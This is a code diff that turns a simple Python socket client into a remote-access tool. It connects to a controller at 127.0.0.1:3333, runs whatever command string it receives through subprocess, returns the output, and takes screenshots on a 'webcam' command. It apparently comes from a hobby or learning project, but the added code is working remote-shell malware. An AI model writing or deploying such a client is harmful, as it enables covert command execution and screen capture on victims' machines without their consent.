@@ -1,44 +1,37 @@
 import os
 import socket
-import platform
+import pyautogui
 import subprocess
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 addr = ('127.0.0.1', 3333)
 sock.connect(addr)
+flag = "200"
 
-def sysinfo():
-    info = f"Processor: {platform.processor()}\n"
-    info += f"Architecture: {platform.architecture()}\n"
-    info += f"Machine: {platform.machine()}\n"
-    info += f"Node: {platform.node()}\n"
-    info += f"Platform: {platform.platform()}\n"
-    info += f"System: {platform.system()}"
-    sock.send(info.encode())
+def snapshot():
+    screens = pyautogui.screenshot()
+    snapname = "name.png"
+    screens.save(snapname)
+    sock.send((flag + snapname).encode())
 
-def shutdown():
-    os.system('shutdown /s')
-
-def restart():
-    os.system('shutdown /r')
-
-def service():
-    srv = subprocess.run(["sc", "query"], text=True, capture_output=True)
-    sock.send(srv.stdout.encode())
+def command(x):
+    cmmd = x.split()
+    if cmmd[0] == "cd":
+        os.chdir(cmmd[1])
+        sock.send(flag.encode())
+    else:
+        output = subprocess.getoutput(cmmd)
+        if output == "":
+            sock.send(flag.encode())
+        else:
+            sock.send(output.encode())
 
 while True:
-    response = sock.recv(1024).decode()
-    print("Received:", response)
+    resp = sock.recv(1024).decode()
+    print("Received:", resp)
 
-    match response:
-        case "system":
-            sysinfo()
-        case "shutdown":
-            shutdown()
-        case "restart":
-            restart()
-        case "service":
-            service()
+    match resp:
+        case "webcam":
+            snapshot()
         case _:
-            code = "404"
-            sock.send(code.encode())
+            command(resp)
